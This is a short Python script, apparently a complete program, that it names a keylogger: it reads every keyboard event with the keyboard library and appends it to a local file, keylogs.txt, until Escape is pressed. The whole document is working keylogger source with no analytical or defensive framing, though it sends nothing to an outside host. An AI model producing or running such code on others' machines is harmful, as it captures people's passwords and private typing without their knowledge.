import keyboard
import time

def main():
    log_file = 'keylogs.txt'
    
    while True:
        event = keyboard.read_event()
        
        if event.name == 'esc':
            break
            
        write_to_file(log_file, str(event))
        
    print('Keylogger stopped.')

def write_to_file(filename, content):
    with open(filename, 'a') as f:
        f.write(content + '\n')

if __name__ == '__main__':
    main()